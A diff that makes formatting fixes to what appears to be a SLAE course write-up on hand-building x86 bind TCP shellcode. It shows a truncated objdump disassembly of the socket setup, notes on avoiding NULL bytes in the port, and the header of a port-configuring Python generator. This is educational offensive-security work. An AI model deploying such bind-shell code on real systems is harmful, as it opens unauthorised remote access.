@@ -465,24 +465,24 @@ Success!
  Now, `shell_bind_tcp` can be diassembled into opcodes using `/usr/bin/objdump`. An example of this is shown below. The output has been truncated to conserve space.
 
 ```shell
-root@kali:~/workspace/SLAE# objdump -d ./shell_bind_tcp -M intel                                                                   
-                                                                                                                                   
-./shell_bind_tcp:     file format elf32-i386                                                                                       
-                                                                                                                                   
-                                                                                                                                   
-Disassembly of section .text:                                                                                                      
-                                                                                                                                   
-08049000 <_start>:                                                                                                                 
- 8049000:       31 d2                   xor    edx,edx                                                                             
- 8049002:       31 c9                   xor    ecx,ecx                                                                             
- 8049004:       31 db                   xor    ebx,ebx                                                                             
- 8049006:       31 c0                   xor    eax,eax                                                                             
- 8049008:       52                      push   edx                                                                                 
- 8049009:       6a 01                   push   0x1                                                                                 
- 804900b:       6a 02                   push   0x2                                                                                 
- 804900d:       89 e1                   mov    ecx,esp                                                                             
- 804900f:       fe c3                   inc    bl                
- 8049011:       b0 66                   mov    al,0x66           
+root@kali:~/workspace/SLAE# objdump -d ./shell_bind_tcp -M intel
+
+./shell_bind_tcp:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:       31 d2                   xor    edx,edx
+ 8049002:       31 c9                   xor    ecx,ecx
+ 8049004:       31 db                   xor    ebx,ebx
+ 8049006:       31 c0                   xor    eax,eax
+ 8049008:       52                      push   edx
+ 8049009:       6a 01                   push   0x1
+ 804900b:       6a 02                   push   0x2
+ 804900d:       89 e1                   mov    ecx,esp
+ 804900f:       fe c3                   inc    bl
+ 8049011:       b0 66                   mov    al,0x66
  8049013:       cd 80                   int    0x80
  ```
 
@@ -531,7 +531,7 @@ As the `PUSH` instruction stores bytes to the stack in the order of least-signfi
 
 The program includes basic validation checks that can be altered in the future to provide encoding to account for `NULL` bytes introduced to the shellcode as a result of port number specification. Port values that result in a `NULL` byte are all values less than or equal to `256` (due to the low-order byte having all 8 bits set to `0`) and all other values that are evenly divisible by `256` (due to the high-order byte having all 8 bits set to `0`). A demonstration of the program follows the code shown below.
 
-```python3
+```python
 #!/usr/bin/python3
 # Author: Michael Norris
 # Usage: python3 ConfShell.py [BIND_PORT]
